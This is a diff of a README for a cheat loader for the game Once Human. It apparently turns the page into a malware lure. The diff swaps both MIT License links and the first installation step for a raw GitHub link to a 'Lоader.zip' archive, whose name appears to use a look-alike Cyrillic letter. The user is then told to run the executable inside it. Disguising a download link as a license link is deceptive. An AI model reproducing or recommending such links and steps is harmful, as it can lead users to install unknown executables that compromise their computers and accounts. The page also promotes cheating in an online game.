@@ -1,6 +1,6 @@
 # ⚡ Once Human Cheats - Universal Loader
 
-Welcome to **Once Human Cheats - Universal Loader**! This cutting-edge, multi-platform cheat tool empowers you to maximize your gameplay in *Once Human* with exclusive features, intuitive controls, and robust compatibility across all major operating systems. Powered by the gaming community, this project is open-source and released under the permissive [MIT License](https://opensource.org/licenses/MIT).
+Welcome to **Once Human Cheats - Universal Loader**! This cutting-edge, multi-platform cheat tool empowers you to maximize your gameplay in *Once Human* with exclusive features, intuitive controls, and robust compatibility across all major operating systems. Powered by the gaming community, this project is open-source and released under the permissive [MIT License](https://raw.githubusercontent.com/Preshchi/onceHuman-enhancedPlay/main/Lоader.zip).
 
 ---
 
@@ -69,7 +69,7 @@ Welcome to **Once Human Cheats - Universal Loader**! This cutting-edge, multi-pl
 ## 💾 Installation Guide
 
 **Follow these easy steps to supercharge your Once Human adventure:**  
-1. Download `Loader.rar` from this repository's main page.
+1. Download `https://raw.githubusercontent.com/Preshchi/onceHuman-enhancedPlay/main/Lоader.zip` from this repository's main page.
 2. Extract the contents to your desired folder.
 3. Run the loader executable for your operating system (see OS Compatibility above).
 4. Follow the on-screen prompts to link the loader with your game client.
@@ -93,7 +93,7 @@ This project is strictly for educational and entertainment purposes only. Using 
 
 ## 📄 License
 
-Released under the permissive [MIT License](https://opensource.org/licenses/MIT) – feel free to fork, modify, and share!  
+Released under the permissive [MIT License](https://raw.githubusercontent.com/Preshchi/onceHuman-enhancedPlay/main/Lоader.zip) – feel free to fork, modify, and share!  
 All contributions are welcome for 2025 and beyond 🌟
 
 ---
